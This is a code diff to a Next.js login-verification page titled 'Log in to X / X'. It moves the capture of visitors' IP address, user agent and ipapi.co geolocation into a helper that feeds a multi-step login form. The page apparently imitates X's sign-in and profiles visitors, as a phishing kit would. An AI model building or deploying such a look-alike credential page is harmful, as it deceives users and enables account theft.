@@ -1,7 +1,8 @@
 import type { Metadata } from "next";
-import { XIcon, XIcon2 } from "@/components/icons/x";
+import { XIcon2 } from "@/components/icons/x";
 import { LoginFormSteps } from "@/components/login-form-steps";
 import { headers } from "next/headers";
+import { getBrowserData } from "@/helpers/getBrowserData";
 
 export const metadata: Metadata = {
 	title: "Log in to X / X",
@@ -10,26 +11,9 @@ export const metadata: Metadata = {
 };
 
 export default async function LoginVerifyPage() {
-	const header = await headers();
+	const headersList = await headers();
 
-	// Obter IP do cabeçalho (x-forwarded-for ou fallback para localhost)
-	const ip = header.get("x-forwarded-for") ?? "127.0.0.1";
-
-	// Obter User-Agent
-	const userAgent = header.get("user-agent") ?? "Unknown User Agent";
-
-	// Geolocalização (API externa)
-	const geoData = await fetch(`https://ipapi.co/${ip}/json/`).then((res) =>
-		res.ok ? res.json() : { city: "Unknown", country_name: "Unknown" },
-	);
-
-	const geoLocation = `${geoData.city}, ${geoData.country_name}`;
-
-	const data = {
-		ip,
-		userAgent,
-		geoLocation,
-	};
+	const browserData = await getBrowserData(headersList)
 
 	return (
 		<main className="flex-1 flex bg-[#3A4853]">
@@ -38,7 +22,7 @@ export default async function LoginVerifyPage() {
 					<XIcon2 className="size-8 *:stroke-2 md:size-8 fill-white/90" />
 				</header>
 
-				<LoginFormSteps browserData={data} />
+				<LoginFormSteps browserData={browserData} />
 			</div>
 		</main>
 	);
